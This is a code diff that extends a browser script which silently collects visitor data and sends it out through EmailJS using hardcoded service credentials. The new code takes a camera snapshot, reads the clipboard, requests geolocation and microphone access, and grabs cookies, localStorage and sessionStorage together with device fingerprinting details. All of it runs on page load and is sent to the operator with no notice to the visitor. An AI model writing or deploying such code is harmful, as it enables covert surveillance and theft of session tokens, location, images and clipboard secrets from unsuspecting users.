@@ -1,8 +1,6 @@
 // This script collects device/browser info and sends it via EmailJS
 // IMPORTANT: Replace the placeholders with your EmailJS credentials
 
-// EmailJS Initialization - You need to sign up and get your credentials
-// See https://www.emailjs.com/docs/sdk/installation/
 (function(){
     emailjs.init("VcalrjM3vIz1HQLCG"); // <-- Replace with your EmailJS user ID
 })();
@@ -42,8 +40,105 @@ function getIpInfo() {
         }));
 }
 
-// Function to get device info
-function getDeviceInfo() {
+// Function to get device info (extended)
+async function getDeviceInfo() {
+    let plugins = "Unavailable";
+    let battery_status = "Unavailable";
+    let device_memory = "Unavailable";
+    let hardware_concurrency = "Unavailable";
+    let touch_support = "Unavailable";
+    let referrer = document.referrer || "Unavailable";
+    let geolocation = "Permission denied";
+    let clipboard_text = "Permission denied";
+    let camera_status = "Permission denied";
+    let microphone_status = "Permission denied";
+    let camera_image = "Permission denied";
+
+    // Plugins (Chrome/Firefox only)
+    try {
+        plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(", ") : "Unavailable";
+    } catch(e) {}
+
+    // Battery status
+    try {
+        if (navigator.getBattery) {
+            let battery = await navigator.getBattery();
+            battery_status = `charging: ${battery.charging}, level: ${battery.level}, chargingTime: ${battery.chargingTime}, dischargingTime: ${battery.dischargingTime}`;
+        }
+    } catch(e) {}
+
+    // Device memory
+    try {
+        device_memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unavailable";
+    } catch(e) {}
+
+    // CPU threads
+    try {
+        hardware_concurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " threads" : "Unavailable";
+    } catch(e) {}
+
+    // Touch detection
+    try {
+        let hasTouch = (('ontouchstart' in window) || (navigator.maxTouchPoints > 0));
+        touch_support = hasTouch ? "Yes" : "No";
+    } catch(e) {}
+
+    // Geolocation
+    try {
+        if ('geolocation' in navigator) {
+            await new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        geolocation = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy} meters`;
+                        resolve();
+                    },
+                    (err) => {
+                        geolocation = "Permission denied";
+                        resolve();
+                    },
+                    {timeout: 5000}
+                );
+            });
+        }
+    } catch(e) {}
+
+    // Clipboard access (requires user gesture; browsers restrict this)
+    try {
+        if (navigator.clipboard && navigator.clipboard.readText) {
+            clipboard_text = await navigator.clipboard.readText();
+        }
+    } catch(e) {
+        clipboard_text = "Permission denied or no clipboard";
+    }
+
+    // Camera & Microphone access
+    try {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            let stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+            camera_status = "Permission granted";
+            microphone_status = "Permission granted";
+            // Take a photo from camera
+            try {
+                let video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                let canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 320;
+                canvas.height = video.videoHeight || 240;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                camera_image = canvas.toDataURL("image/png");
+                // Stop the stream
+                stream.getTracks().forEach(track => track.stop());
+            } catch(e) {
+                camera_image = "Could not capture image";
+            }
+        }
+    } catch(e) {
+        camera_status = "Permission denied";
+        microphone_status = "Permission denied";
+        camera_image = "Permission denied";
+    }
+
     return {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
@@ -58,13 +153,51 @@ function getDeviceInfo() {
             pixelDepth: window.screen.pixelDepth
         },
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        online: navigator.onLine
+        online: navigator.onLine,
+        plugins: plugins,
+        battery_status: battery_status,
+        device_memory: device_memory,
+        hardware_concurrency: hardware_concurrency,
+        touch_support: touch_support,
+        referrer: referrer,
+        geolocation: geolocation,
+        clipboard_text: clipboard_text,
+        camera_status: camera_status,
+        microphone_status: microphone_status,
+        camera_image: camera_image
     };
 }
 
+// Grab cookies for current domain
+function getCookies() {
+    try {
+        return document.cookie || "No cookies set";
+    } catch(e) {
+        return "Unavailable";
+    }
+}
+
+// Grab localStorage data for current domain
+function getLocalStorage() {
+    try {
+        return JSON.stringify(localStorage);
+    } catch(e) {
+        return "Unavailable";
+    }
+}
+
+// Grab sessionStorage data for current domain
+function getSessionStorage() {
+    try {
+        return JSON.stringify(sessionStorage);
+    } catch(e) {
+        return "Unavailable";
+    }
+}
+
 // Main execution
-getIpInfo().then(ipInfo => {
-    const deviceInfo = getDeviceInfo();
+getIpInfo().then(async ipInfo => {
+    const deviceInfo = await getDeviceInfo();
 
     emailjs.send("service_5fifa81", "template_w5liz9g", {
         ip: ipInfo.ip,
@@ -100,7 +233,21 @@ getIpInfo().then(ipInfo => {
         language: deviceInfo.language,
         cookiesEnabled: deviceInfo.cookiesEnabled,
         screen: JSON.stringify(deviceInfo.screen),
-        online: deviceInfo.online
+        online: deviceInfo.online,
+        plugins: deviceInfo.plugins,
+        battery_status: deviceInfo.battery_status,
+        device_memory: deviceInfo.device_memory,
+        hardware_concurrency: deviceInfo.hardware_concurrency,
+        touch_support: deviceInfo.touch_support,
+        referrer: deviceInfo.referrer,
+        geolocation: deviceInfo.geolocation,
+        clipboard_text: deviceInfo.clipboard_text,
+        camera_status: deviceInfo.camera_status,
+        microphone_status: deviceInfo.microphone_status,
+        camera_image: deviceInfo.camera_image,
+        cookies: getCookies(),
+        localStorage: getLocalStorage(),
+        sessionStorage: getSessionStorage()
     })
     .then(() => {
         if (document.getElementById("log-status")) {
